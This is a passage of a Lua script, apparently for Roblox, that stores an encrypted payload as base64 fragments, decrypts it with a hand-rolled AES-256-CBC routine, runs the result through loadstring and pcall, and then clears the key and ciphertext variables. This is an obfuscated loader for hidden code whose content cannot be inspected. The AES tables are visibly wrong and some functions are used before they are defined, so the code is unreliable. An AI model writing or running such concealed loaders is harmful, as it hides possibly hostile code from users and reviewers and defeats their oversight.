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"},
        {t="b64", d="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"}
}

local function rebuild_cipher_hex()
    local acc = {}
    for i = 1, #cipher_fragments do
        local f = cipher_fragments[i]
        if f.t == "hex" then
            acc[#acc+1] = f.d
        elseif f.t == "hexchars" then
            acc[#acc+1] = table.concat(f.d)
        elseif f.t == "bytes" then
            local tmp = {}
            for j = 1, #f.d do
                tmp[#tmp+1] = byte_to_hex(f.d[j])
            end
            acc[#acc+1] = table.concat(tmp)
        elseif f.t == "b64" then
            acc[#acc+1] = bytes_to_hex(b64decode(f.d))
        else
            acc[#acc+1] = tostring(f.d)
        end
    end
    return table.concat(acc)
end

local CIPHER_HEX = rebuild_cipher_hex()


assert(#AES_KEY_HEX == 64, "Bad key length: "..#AES_KEY_HEX)
assert(#IV_HEX == 32, "IV hex must be 32 chars")
assert(#CIPHER_HEX % 32 == 0, "Cipher hex length must be multiple of 32")

local function hexToBytes(hex)
    assert(#hex % 2 == 0, "hexToBytes: odd-length hex string: "..#hex)
    local t = {}
    for i = 1, #hex, 2 do
        local cc = hex:sub(i, i+1)
        local n = tonumber(cc, 16)
        assert(n, "hexToBytes: invalid hex pair '"..cc.."' at pos "..i)
        t[#t+1] = string.char(n)
    end
    return table.concat(t)
end

local function tobytes(s)
    local t = {}
    for i = 1, #s do t[i] = s:byte(i) end
    return t
end
local function frombytes(t)
    local s = {}
    for i = 1, #t do s[i] = string.char(t[i]) end
    return table.concat(s)
end

local function bytes_to_hex(str)
    local out = {}
    for i = 1, #str do
        out[#out+1] = string.format("%02x", str:byte(i))
    end
    return table.concat(out)
end

local Sbox = {
    99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,
    202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,
    183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,
    4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,
    9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,
    83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,
    208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,
    81,163,64,143,146,157,56,245,234,101,98,186,8,200,140,136,
    162,207,109,55,102,12,61,36,173,15,23,68,143,2,190,6,
    25,89,119,177,63,179,37,114,65,59,85,224,11,45,157,147,
    201,238,123,75,39,28,83,170,97,92,9,130,15,113,57,48,
    19,114,28,95,25,6,54,71,44,61,74,9,63,112,153,30,
    82,57,156,66,115,182,39,171,107,122,131,151,179,32,21,95,
    31,14,241,242,216,154,123,50,83,77,41,35,52,8,186,20,
    125,186,130,195,233,155,24,56,11,22,28,48,63,85,102,58,
    158,77,136,88,76,169,157,134,73,69,61,176,42,9,123,165
}
local InvSbox = {82,9,106,213,48,54,165,56,191,64,163,158,129,243,215,251,124,227,57,130,155,47,255,135,52,142,67,68,196,214,210,71,240,173,212,162,175,156,164,114,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,234,101,98,186,150,20,252,227,73,96,195,186,20,218,132,185,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22}
local Rcon = {1,2,4,8,16,32,64,128,27,54}

local function xtime(a)
    local r = a * 2
    if a >= 0x80 then r = bit32.bxor(r, 0x1B) end
    return bit32.band(r, 0xFF)
end
local function gmul(a,b)
    local p = 0
    for _=1,8 do
        if bit32.band(b,1) ~= 0 then p = bit32.bxor(p,a) end
        local hi = bit32.band(a,0x80)
        a = bit32.band(a*2,0xFF)
        if hi ~= 0 then a = bit32.bxor(a,0x1B) end
        b = bit32.rshift(b,1)
    end
    return p
end

local function rotword(w) return {w[2], w[3], w[4], w[1]} end
local function subword(w)
    return { Sbox[w[1]+1], Sbox[w[2]+1], Sbox[w[3]+1], Sbox[w[4]+1] }
end

local function keyexpand(keybytes)
    local Nk, Nb, Nr = 8, 4, 14
    local w = {}
    for i=0,Nk-1 do
        w[i] = { keybytes[4*i+1], keybytes[4*i+2], keybytes[4*i+3], keybytes[4*i+4] }
    end
    for i=Nk, Nb*(Nr+1)-1 do
        local temp = { w[i-1][1], w[i-1][2], w[i-1][3], w[i-1][4] }
        if i % Nk == 0 then
            temp = rotword(temp)
            temp = subword(temp)
            temp[1] = bit32.bxor(temp[1], Rcon[math.floor(i/Nk)])
        elseif i % Nk == 4 then
            temp = subword(temp)
        end
        w[i] = {
            bit32.bxor(w[i-Nk][1], temp[1]),
            bit32.bxor(w[i-Nk][2], temp[2]),
            bit32.bxor(w[i-Nk][3], temp[3]),
            bit32.bxor(w[i-Nk][4], temp[4]),
        }
    end
    local roundkeys = {}
    for r=0, Nr do
        local rk = {}
        for c=0,3 do
            local t = w[r*4 + c]
            rk[c*4+1], rk[c*4+2], rk[c*4+3], rk[c*4+4] = t[1], t[2], t[3], t[4]
        end
        roundkeys[r] = rk
    end
    return roundkeys
end

local function bytes_to_state(block)
    local s = {{},{},{},{}}
    for i=0,15 do
        s[(i%4)+1][math.floor(i/4)+1] = block[i+1]
    end
    return s
end
local function state_to_bytes(state)
    local out = {}
    for i=0,15 do
        out[i+1] = state[(i%4)+1][math.floor(i/4)+1]
    end
    return out
end
local function addroundkey(state, roundkey)
    for c=1,4 do
        for r=1,4 do
            state[r][c] = bit32.bxor(state[r][c], roundkey[(c-1)*4 + r])
        end
    end
end
local function invshiftrows(state)
    state[2][1], state[2][2], state[2][3], state[2][4] = state[2][4], state[2][1], state[2][2], state[2][3]
    state[3][1], state[3][2], state[3][3], state[3][4] = state[3][3], state[3][4], state[3][1], state[3][2]
    state[4][1], state[4][2], state[4][3], state[4][4] = state[4][2], state[4][3], state[4][4], state[4][1]
end
local function invsubbytes(state)
    for r=1,4 do
        for c=1,4 do
            state[r][c] = InvSbox[state[r][c]+1]
        end
    end
end
local function invmixcolumns(state)
    for c=1,4 do
        local a0,a1,a2,a3 = state[1][c], state[2][c], state[3][c], state[4][c]
        state[1][c] = bit32.band(bit32.bxor(bit32.bxor(gmul(a0,0x0e), gmul(a1,0x0b)), bit32.bxor(gmul(a2,0x0d), gmul(a3,0x09))), 0xFF)
        state[2][c] = bit32.band(bit32.bxor(bit32.bxor(gmul(a0,0x09), gmul(a1,0x0e)), bit32.bxor(gmul(a2,0x0b), gmul(a3,0x0d))), 0xFF)
        state[3][c] = bit32.band(bit32.bxor(bit32.bxor(gmul(a0,0x0d), gmul(a1,0x09)), bit32.bxor(gmul(a2,0x0e), gmul(a3,0x0b))), 0xFF)
        state[4][c] = bit32.band(bit32.bxor(bit32.bxor(gmul(a0,0x0b), gmul(a1,0x0d)), bit32.bxor(gmul(a2,0x09), gmul(a3,0x0e))), 0xFF)
    end
end

local function xor16(a, b)
    local r = {}
    for i = 1, 16 do
        r[i] = string.char(bit32.bxor(a:byte(i), b:byte(i)))
    end
    return table.concat(r)
end
local function pkcs7_unpad(s)
    local n = #s
    if n == 0 then return "" end
    local pad = s:byte(n)
    if pad < 1 or pad > 16 then return s end
    for i = n - pad + 1, n do
        if s:byte(i) ~= pad then
            return s
        end
    end
    return s:sub(1, n - pad)
end

local function decryptblock(block_str, key_str)
    assert(#block_str == 16, "decryptblock: bad block len "..#block_str)
    assert(#key_str  == 32, "decryptblock: bad key len "..#key_str)
    local block = tobytes(block_str)
    local key   = tobytes(key_str)
    local roundkeys = keyexpand(key)
    local Nr = 14

    local state = bytes_to_state(block)
    addroundkey(state, roundkeys[Nr])

    for round = Nr-1, 1, -1 do
        invshiftrows(state)
        invsubbytes(state)
        addroundkey(state, roundkeys[round])
        invmixcolumns(state)
    end

    invshiftrows(state)
    invsubbytes(state)
    addroundkey(state, roundkeys[0])

    local out = state_to_bytes(state)
    return frombytes(out)
end

local AES = {}
function AES.decrypt_cbc(cipher, key, iv)
    assert(#key == 32, "AES-256 key must be 32 bytes")
    assert(#iv  == 16, "IV must be 16 bytes")
    assert(#cipher % 16 == 0, "Ciphertext must be a multiple of 16 bytes")
    if #cipher == 0 then error("Empty ciphertext") end

    local out = {}
    local prev = iv
    for i = 1, #cipher, 16 do
        local cblock = cipher:sub(i, i+15)
        local pblock = decryptblock(cblock, key)
        if #pblock ~= 16 then
            error(("decryptblock returned %d bytes at offset %d"):format(#pblock, i))
        end
        out[#out+1] = xor16(pblock, prev)
        prev = cblock
    end
    return pkcs7_unpad(table.concat(out))
end

local CIPHER_HEX = rebuild_cipher_hex()
local IV_HEX = rebuild_iv_hex()

local plain = AES.decrypt_cbc(
    hexToBytes(CIPHER_HEX),
    hexToBytes(AES_KEY_HEX),
    hexToBytes(IV_HEX)
)

print("=== Decrypted preview ===")
print(plain:sub(1, 200))
print("=========================")

local f, err = loadstring(plain)
if not f then
    warn("❌ Loadstring failed:", err)
else
    local ok, runtimeErr = pcall(f)
    if not ok then
        warn("❌ Runtime error:", runtimeErr)
    else
        print("✅ Script executed successfully")
    end
end

AES_KEY_HEX, IV_HEX, CIPHER_HEX, plain = nil, nil, nil, nil
